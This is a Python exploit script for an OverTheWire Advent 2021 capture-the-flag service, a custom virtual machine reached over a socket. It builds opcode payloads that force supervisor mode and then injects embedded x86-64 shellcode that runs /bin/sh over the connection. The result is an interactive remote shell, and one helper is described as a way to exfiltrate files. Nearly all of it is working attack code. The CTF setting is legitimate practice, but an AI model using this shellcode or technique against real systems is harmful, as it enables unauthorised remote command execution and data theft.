#!/usr/bin/env python3

import re
import socket
import struct
import sys
import threading
import time

DEBUG = False

HOST = 'vmas.advent2021.overthewire.org'
PORT = 1216

# Shellcode
#
# Taken from: https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440

SHELLCODE = b'\x48\x31\xc0\x50\x50\x50\x5e\x5a\x50\x5f\xb0\x20\x0f\x05\x48\xff\xc8\x48\xff\xc8\x50\x5f\xb0\x21\x0f\x05\x48\xff\xc6\x48\x89\xf0\x3c\x02\x75\xf2\x52\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x54\x5f\x52\x5e\xb0\x3b\x0f\x05'

# Registers

REG_A = 0x01
REG_B = 0x02
REG_C = 0x04
REG_D = 0x08
REG_FLAGS = 0x10

REGISTERS = [
        REG_A,
        REG_B,
        REG_C,
        REG_D,
        REG_FLAGS
]

# Opcodes

OP_SUPERVISOR = 0x00
OP_MOV = 0x01
OP_ADD = 0x02
OP_STORE = 0x04
OP_LOAD = 0x08
OP_COMPARE = 0x10
OP_JUMP_ZERO = 0x20
OP_DEBUG = 0x40
OP_SYSCALL = 0x80
OP_EXCEPTION = 0xff

# Supervisor

SUPERVISOR_EXIT = 0x00
SUPERVISOR_RESET = 0x01
SUPERVISOR_BOOTCODE = 0x02

SUPERVISOR_COMMANDS = [
    SUPERVISOR_EXIT,
    SUPERVISOR_RESET,
    SUPERVISOR_BOOTCODE,
]

# Syscalls

SYSCALL_SLEEP = 0x00
SYSCALL_OPEN = 0x01
SYSCALL_READ = 0x02
SYSCALL_WRITE = 0x04
SYSCALL_SENDFILE = 0x08
SYSCALL_CLOSE = 0x10

SYSCALLS = [
    SYSCALL_SLEEP,
    SYSCALL_OPEN,
    SYSCALL_READ,
    SYSCALL_WRITE,
    SYSCALL_SENDFILE,
    SYSCALL_CLOSE,
]

# Helpers

def connect():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))

    return sock

def cleanup_response(s):
    s = strip_junk(s)
    return strip_header(s)

def strip_junk(s):
    # Strip non-ascii characters
    asc = ''.join([chr(x) for x in s if x < 0x100])

    # Taken from:
    # https://stackoverflow.com/questions/14693701/how-can-i-remove-the-ansi-escape-sequences-from-a-string-in-python
    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
    return ansi_escape.sub('', asc)

def strip_header(s):
    i = s.index('code:')
    return s[i:]

# Operations we can perform

def op_supervisor(cmd, arg):
    assert cmd in SUPERVISOR_COMMANDS

    return struct.pack('>BBB', OP_SUPERVISOR, arg, cmd)

def op_mov(dst, value):
    assert value <= 0xff
    assert dst in REGISTERS

    return struct.pack('>BBB', OP_MOV, value, dst)

def op_add(src, dst):
    assert src in REGISTERS
    assert dst in REGISTERS

    return struct.pack('>BBB', OP_ADD, src, dst)

def op_store(src, dst):
    assert src in REGISTERS
    assert dst in REGISTERS

    return struct.pack('>BBB', OP_STORE, src, dst)

def op_load(reg):
    assert reg in REGISTERS

    return struct.pack('>BBB', OP_LOAD, reg, reg)

def op_compare(reg_one, reg_two):
    assert reg_one in REGISTERS
    assert reg_two in REGISTERS

    return struct.pack('>BBB', OP_COMPARE, reg_one, reg_two)

def op_jump_zero(reg_one, reg_two):
    assert reg_one in REGISTERS
    assert reg_two in REGISTERS

    return struct.pack('>BBB', OP_JUMP_ZERO, reg_one, reg_two)

def op_debug():
    return struct.pack('>BBB', OP_DEBUG, 0x10, 0x01)

def op_syscall(reg_syscall_num):
    assert reg_syscall_num in SYSCALLS

    # Always store response in register A
    return struct.pack('>BBB', OP_SYSCALL, REG_A, reg_syscall_num)

def op_exception(errno):
    return struct.pack('>BBB', OP_EXCEPTION, 0x00, errno)

# High level wrapper functions

def store_string(src, dst, inp):
    req = b''
    for i in inp:
        # Move char into src
        req += op_mov(src, ord(i))

        # Move char from src into dst memory
        req += op_store(src, dst)

        # Use register D to incrememnt dst
        req += op_mov(REG_D, 0x01)
        req += op_add(REG_D, dst)

    return req

def read_socket_response(sock):

    # Save responses to file for convenience

    if DEBUG:
        f = open('output_from_server', 'wb+')

    # Receive response from socket

    resp = b''
    while True:
        new = sock.recv(1024)
        if not new:
            break

        if DEBUG:
            f.write(new)

        print(strip_junk(new), end='') # print intermediate responses

        resp += new

    return cleanup_response(resp)

def send_request(req, sock=None):

    # Verify request length

    if len(req) > 0xff:
        print(f'Request length must be less than 256. Given length was: {len(req)}')

    # Socket setup

    providedSocket = sock is not None
    if not providedSocket:
        sock = connect()

    time.sleep(0.2)

    print(f'Request length: {len(req)}')

    # Send input

    sock.sendall(req)

    # Receive response from socket

    cleaned = read_socket_response(sock)

    # Cleanup

    if not providedSocket:
        sock.close()

    return cleaned

# Wrappers to talk with the server

# read_file is left as an example of how to use the standard commands to
# exfiltrate a file.
#
# Combine with the `DEBUG` flag to log response (which will contain
# non-ascii) to save the file.
def read_file(file_name):

    # Create input

    req = b''

    # Write file name to memory

    req += op_mov(REG_A, 0x05)
    req += store_string(REG_B, REG_A, file_name)

    # Syscall: open

    req += op_mov(REG_A, 0x05)
    req += op_mov(REG_B, 0x22)
    req += op_mov(REG_C, 0x22)
    req += op_syscall(SYSCALL_OPEN)

    # Syscall: send file from local to remote

    req += op_mov(REG_A, 0x01)
    req += op_mov(REG_B, 0x03)
    req += op_syscall(SYSCALL_SENDFILE)

    # Display response

    resp = send_request(req)
    print(resp)

def spawn_shell(cmds=[]):

    # Create input

    req = b''

    # Trigger unhandled exception to enter supervisor mode

    req += op_exception(0x03)

    # Read bootcode from socket

    req += op_supervisor(SUPERVISOR_BOOTCODE, 0x00)

    # Reset to trigger bootcode

    req += op_supervisor(SUPERVISOR_RESET, 0x00)

    # Setup the connection where we do the following:
    # - Send the initial payload (`req`)
    # - Start a separate thread (with a delay so that `req` gets sent first)
    #   - In this thread, inject our shellcode to the boot location
    #   - Run pre-fabbed commands or allow the user (via their local shell)
    #     to provide commands ad-hoc
    #
    # Teardown will require

    sock = connect()

    def inject_shellcode(sock, cmds):
        def submit_command(cmd):
            sock.sendall(cmd.encode() + b'\n')
            time.sleep(0.3)

        def close_connection(sock):
            sock.close()
            quit()

        print('Injecting shellcode')
        sock.sendall(SHELLCODE)

        time.sleep(0.5)

        for cmd in cmds:
            submit_command(cmd)

        if len(cmds) != 0:
            close_connection(sock)

        while True:
            inp = input('command to run ("exit" to exit): ')
            if inp == 'exit':
                close_connection(sock)

            submit_command(inp)
            print()

    t = threading.Timer(1.0, inject_shellcode, args=[sock, cmds])
    t.start()

    # Display the response

    resp = send_request(req, sock=sock)
    print(resp)

    # Wait for thread to stop

    t.join()

    # Cleanup

    sock.close()

def exploit():
    spawn_shell(['cat bet_you_didnt_guess_this_flag_name'])

if __name__ == '__main__':

    if len(sys.argv) != 2:
        print(f'Usage: {sys.argv[0]} (exploit|shell)')
        quit()

    spawn = True if sys.argv[1] == 'shell' else False

    if spawn:
        spawn_shell()
    else:
        exploit()
